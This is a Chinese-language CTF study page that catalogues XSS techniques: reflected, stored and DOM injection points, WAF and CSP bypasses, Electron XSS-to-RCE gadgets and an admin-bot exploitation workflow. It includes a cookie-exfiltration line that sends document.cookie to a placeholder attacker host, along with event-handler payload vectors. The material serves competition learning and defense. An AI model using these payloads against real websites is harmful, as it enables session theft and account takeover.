---
comments: true
---

# XSS

> WEB · 知识域。跨站脚本注入与浏览器端数据外带。标签:**反射型XSS**、**储存型XSS**、**DOMXSS**、**WAF绕过XSS**、**Electron中XSS**。

## 触发特征

- 题目带 admin bot / XSS bot(给出提交 URL 让 bot 访问)——几乎所有 XSS 题的标配。
- 富文本、评论区、昵称等渲染点;CSP 头提示。

## 反射型XSS

- 入口:URL 参数、Referer 头注入(Tokyo Westerns 2017)、`location.hash`(jQuery `$(location.hash)` CSS 选择器时延侧信道,hxp 2018)。
- DOM XSS:jQuery `$(location.hash)`、`hashchange` 事件型(Crypto-Cat)、DOM Clobbering + MIME 不一致。
- Shadow DOM、`innerHTML` sink、`document.write`。

## 储存型XSS

- 落库后管理员/机器人查看触发;配合 CSRF 打特权操作(见 [CSRF](csrf.md))。
- 跨域变体:共享父域 Cookie 注入实现跨子域 XSS(0CTF 2017);缓存投毒让公共页面带 payload(CONFidence 2019 Teaser:.js 用户名 + 存储 SVG)。

## WAF绕过XSS

- 编码:HTML 实体、unicode 转义、hex;大小写、双写、换行拆分标签。
- 无 `<script>`:`<img onerror>`、`<svg onload>`、`<details ontoggle>`、`<iframe srcdoc>`。
- CSP 绕过:
  - nonce 泄露或 `<base>` 标签劫持相对路径(BSidesSF 2026);
  - 白名单域被滥用:Cloud Function 白名单域(BSidesSF 2025)、Hyperscript/Alpine CDN(UNbreakable 2026)、攻击者可控 mime-type 同源加载(Midnight Sun CTF Finals 2018)、link prefetch(Boston Key Party 2016);
  - `javascript:` URL 在 bot 场景的特殊处理(DiceCTF 2026)。
- Unicode 套路:大小写折叠绕过(U+017F 长s,UNbreakable 2026)、Chrome URL 归一化(RCTF 2017)、点过滤用十进制 IP + 括号取属性(33C3 CTF 2016)。
- 框架逃逸:AngularJS 1.x 沙箱(charAt/trim 覆写,Google CTF 2017)、DOMPurify 经可信后端路由绕过、JPEG+HTML polyglot(EHAX 2026)。

## 数据外带(exfil)

- Cookie:`document.location='//attacker/?c='+document.cookie`。
- 无外带通道时:CSS 字体字形宽度 + container query 逐字符侧信道(UNbreakable 2026)、`@font-face unicode-range`(Harekaze CTF 2018)、图片加载时序 XS-Leak + GraphQL CSRF(HTB GrandMonty)。
- JSONP 回调 XSSI 外带(BSidesSF 2026);postMessage null origin(data: URI iframe,BackdoorCTF 2018)。

## Electron中XSS

- Electron 渲染进程 XSS = RCE 前置:检查 `nodeIntegration`、`contextIsolation`。
- 可用 gadget:`window.require` 直接 require('child_process');`preload` 暴露的 IPC bridge 调 `ipcRenderer.send` 执行主进程能力。
- 组合:ASAR 解包审计(见 [Reverse](../reverse/index.md))找渲染入口 → XSS → IPC → RCE。

## 利用流程(admin bot 题)

1. 探测 bot 环境:UA、能访问哪些路径(用自身能否加载判断)。
2. 找注入 sink + 出口;CSP 存在先解 CSP。
3. payload 托管到可控 VPS/webhook,bot 访问即回传。
4. bot 内操作通常需要:访问 `/flag`、携带特权 Cookie 调 API → 优先尝试 fetch 同源接口回读。

## 转向

- 需要打 API 但无 bot → [CSRF](csrf.md);客户端逻辑太绕 → [JS](js.md)
